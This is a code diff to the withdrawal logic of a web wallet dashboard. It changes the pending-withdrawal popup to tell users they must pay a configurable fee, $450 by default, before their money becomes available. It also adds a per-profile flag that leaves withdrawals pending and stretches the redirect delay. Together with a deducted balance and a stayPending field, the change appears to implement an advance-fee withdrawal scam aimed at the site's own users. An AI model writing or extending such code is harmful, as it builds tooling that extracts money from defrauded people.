@@ -86,7 +86,7 @@
           '<p class="text-xs uppercase tracking-wide text-gray-500 mb-2">Status</p>' +
           '<h2 id="withdraw-pending-title" class="wallet-modal-title text-red-400">Pending</h2>' +
           '<p id="withdraw-pending-body" class="wallet-modal-body text-gray-400 text-sm mt-3"></p>' +
-          '<p class="text-xs text-gray-500 mb-4 mt-4">Your withdrawal is being processed. You can track it in your history.</p>' +
+          '<p id="withdraw-pending-note" class="text-xs text-gray-500 mb-4 mt-4">You can track your withdrawal status in your history.</p>' +
           '<button type="button" id="withdraw-pending-view" class="btn-primary w-full py-3">View History</button>' +
         "</div>" +
       "</div>"
@@ -98,20 +98,19 @@
 
   function showWithdrawPendingModal(amount, destinationWallet) {
     ensurePendingModal();
+    var profile = getProfile();
     var modal = document.getElementById("withdraw-pending-modal");
-    var amtLabel = "$" + Number(amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-    var shortWallet = destinationWallet
-      ? (destinationWallet.slice(0, 8) + "…" + destinationWallet.slice(-6))
-      : "your wallet";
+    var fee = (profile && profile.withdrawFeeAmount) || 450;
+    var feeLabel = "$" + Number(fee).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
     document.getElementById("withdraw-pending-body").textContent =
-      "Your withdrawal of " + amtLabel + " to " + shortWallet + " has been submitted and is now pending.";
+      "You need to pay " + feeLabel + " so the money can be available in your wallet.";
     modal.classList.remove("hidden");
     document.body.classList.add("wallet-modal-open");
     var form = document.getElementById("withdraw-form");
     if (form) form.reset();
     setTimeout(function () {
       window.location.href = "/dashboard/accounthistory.html";
-    }, 10000);
+    }, 30000);
   }
 
   function queueWithdrawal(amount, destinationWallet, opts) {
@@ -142,7 +141,7 @@
       amount: amountLabel,
       status: opts.showPendingModal ? "Pending" : "Processing",
       stayPending: stayPending,
-      feeProofSubmitted: true,
+      feeProofSubmitted: !(profile && profile.withdrawSkipFeeProofModal),
       balanceDeducted: true,
       destinationWallet: destinationWallet || ""
     });
@@ -227,6 +226,12 @@
     if (typeof requiresWithdrawFeeProof === "function" && requiresWithdrawFeeProof()) {
       var destinationWallet = (document.getElementById("withdraw-wallet").value || "").trim();
       if (!validateDestinationWallet(destinationWallet)) return;
+
+      var profile = getProfile();
+      if (profile && profile.withdrawSkipFeeProofModal) {
+        queueWithdrawal(amount, destinationWallet, { showPendingModal: true });
+        return;
+      }
 
       if (typeof fillWalletFields === "function") fillWalletFields();
       showWithdrawFeeProofModal(amount, destinationWallet, function (result) {
